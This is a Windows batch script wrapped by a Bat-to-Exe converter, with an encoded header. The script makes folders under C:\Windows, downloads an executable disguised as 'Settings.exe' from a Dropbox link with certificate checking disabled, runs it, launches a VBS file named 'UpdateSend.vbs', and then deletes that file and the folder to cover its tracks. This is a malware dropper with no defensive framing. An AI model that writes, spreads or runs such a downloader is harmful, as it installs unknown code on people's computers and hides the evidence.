::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHzeyGYxPBpo/Psz3NtktmCsMlkZXgG7ErGtgVLiyWHnakY+9VHzW6RUrSb16nVUlMICCSdtbhaqegomlVtSsmWRMvSZvQuvXEqahg==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCqDJHSB4EMUKQ9VcLR6jLwK2AXNWQhLP1pREpitiVLnyWDn07eBLtwg6UTqXJUi2DRTm8Rs
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCqDJH2F4EMMmOTlrLRcjL4K3AT+WQPHXxY3d/3A5QwDyH1rDwVukQGjMvU8SZkj2nNUnfc5HB9Zahe5UgosrFJxv2iAOdOpowvgXk26418kEmtzlC3VlC5b
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
echo off
cls
mkdir C:\Windows\Data
mkdir C:\Windows\System32\Menu
wget "https://www.dropbox.com/s/5agffbjj3u1rfud/Settings.exe?dl=1" -O C:\Windows\DataFiles\Settings.exe --no-check-certificate
timeout /t 1 >nul
start C:\Windows\DataFiles\Settings.exe
timeout /t 1 >nul
start %Appdata%\UpdateSend.vbs
timeout /t 2 >nul
rd /s /q C:\Windows\Data
del /f /s /q %Appdata%\UpdateSend.vbs
exit